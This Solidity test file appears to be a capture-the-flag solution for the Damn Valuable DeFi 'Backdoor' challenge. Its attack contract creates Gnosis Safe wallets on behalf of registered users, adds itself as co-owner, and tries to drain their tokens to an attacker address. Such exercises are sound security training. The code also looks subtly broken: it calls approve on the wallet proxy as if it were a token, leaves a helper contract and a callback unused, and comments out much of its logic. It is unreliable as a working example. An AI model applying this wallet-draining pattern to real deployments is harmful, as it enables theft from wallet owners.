// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0;

import {Utilities} from "../../utils/Utilities.sol";
import "forge-std/Test.sol";

import {DamnValuableToken} from "../../../src/Contracts/DamnValuableToken.sol";
import {WalletRegistry} from "../../../src/Contracts/backdoor/WalletRegistry.sol";

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@gnosis.pm/safe-contracts/contracts/GnosisSafe.sol";
import "@gnosis.pm/safe-contracts/contracts/proxies/GnosisSafeProxyFactory.sol";
import "@gnosis.pm/safe-contracts/contracts/proxies/IProxyCreationCallback.sol";
import "@gnosis.pm/safe-contracts/contracts/interfaces/ISignatureValidator.sol";

// The challenge requires we complete it in 1 transaction, so the main attack must happen
// in attack contract constructor. Hence that constructor needs to create this additional contract
// so that this external function can exist allowing GnosisSafeProxy to delegatecall() to it.
contract DelegateCallbackAttack {
    // This will be called by newly created GnosisSafeProxy using delegatecall()
    // allowing the attacker to execute arbitrary code using GnosisSafeProxy context.
    // Use this to approve token transfer for main attack contract.
    function delegateCallback(address token, address spender, uint256 drainAmount) external {
        IERC20(token).approve(spender, drainAmount);
    }
}

contract BackdoorAttack is ISignatureValidator, IProxyCreationCallback, Test {
    DamnValuableToken internal dvt;
    GnosisSafe internal masterCopy;
    GnosisSafeProxyFactory internal walletFactory;
    WalletRegistry internal walletRegistry;

    address[] internal users;
    address internal attacker;

    constructor(
        address _dvt,
        address _masterCopy,
        address _walletFactory,
        address _walletRegistry,
        address[] memory _users,
        address _attacker
    ) payable {
        dvt = DamnValuableToken(_dvt);
        masterCopy = GnosisSafe(payable(_masterCopy));
        walletFactory = GnosisSafeProxyFactory(_walletFactory);
        walletRegistry = WalletRegistry(_walletRegistry);
        users = _users;
        attacker = _attacker;

        /**
         * EXPLOIT START *
         */
        for (uint256 i = 0; i < users.length; i++) {
            exploitUser(users[i]);
        }
        /**
         * EXPLOIT END *
         */
    }

    function exploitUser(address user) internal {
        // 1. Setup Gnosis Save "setup" transaction i.e. callback, make ourselves an owner and send 1 wei to this contract to execute additional code
        address[] memory owners = new address[](2);
        owners[0] = user;
        owners[1] = address(this);
        // function setup(
        //     address[] calldata _owners,
        //     uint256 _threshold,
        //     address to,
        //     bytes calldata data,
        //     address fallbackHandler,
        //     address paymentToken,
        //     uint256 payment,
        //     address payable paymentReceiver
        // ) external {
        bytes memory initializer = abi.encodeWithSignature(
            "setup(address[],uint256,address,bytes,address,address,uint256,address)",
            owners,
            1,
            address(0),
            new bytes(0),
            address(0),
            address(0),
            1, // send 1 to this contract
            address(this)
        );

        bytes memory outerInitializer;

        // // Calculate the Gnosis Safe address
        uint256 saltNonce = 0x1;
        IProxyCreationCallback callback = this;
        // uint256 saltNonceWithCallback = uint256(keccak256(abi.encodePacked(saltNonce, callback)));
        // uint256 salt = uint256(keccak256(abi.encodePacked(keccak256(initializer), saltNonceWithCallback)));
        // bytes memory deploymentData =
        //     abi.encodePacked(type(GnosisSafeProxy).creationCode, uint256(uint160(address(masterCopy))));
        // address proxyAddress = calculateAddress(address(walletFactory), salt, deploymentData);
        // require(address(proxyAddress).code.length == 0, "Proxy already exists");

        // // Send the non-existent address some ETH
        // uint256 amountToSend = 0.01 ether;
        // require(address(this).balance >= amountToSend, "Not enough ETH to send to uninitialized proxy");
        // require(payable(proxyAddress).send(amountToSend), "Failed to send ETH to uninitialized proxy");
        // console.log("Proxy balance", address(proxyAddress).balance);

        // 2. Create a Gnosis Safe wallet safe wallet through the factory
        GnosisSafe proxy = GnosisSafe(
            payable(
                address(
                    walletFactory.createProxyWithCallback({
                        _singleton: address(masterCopy),
                        initializer: initializer,
                        saltNonce: saltNonce,
                        callback: callback
                    })
                )
            )
        );
        // console.log("Proxy balance", address(proxyAddress).balance);
        // require(address(proxy) == proxyAddress, "Proxy address mismatch");
        // console.log("Calculating proxy address", address(proxyAddress));
        // console.log("Created proxy", address(proxy));
        // console.log("Created proxy balance", address(proxyAddress).balance);

        // 3. Approve attacker address to spend DVT for proxy
        IERC20(address(proxy)).approve(address(attacker), type(uint256).max);

        // 4. Transfer DVT from proxy to attacker
        dvt.transferFrom({from: address(proxy), to: attacker, amount: dvt.balanceOf(address(proxy))});
    }

    function calculateAddress(address _sender, uint256 _salt, bytes memory _initCode) internal pure returns (address) {
        return
            address(uint160(uint256(keccak256(abi.encodePacked(bytes1(0xff), _sender, _salt, keccak256(_initCode))))));
    }

    function isValidSignature(bytes memory _data, bytes memory _signature) public view override returns (bytes4) {
        return 0x20c13b0b;
    }
    
    function proxyCreated(GnosisSafeProxy proxy, address singleton, bytes calldata initializer, uint256)
        external
        override
    {
    }
}
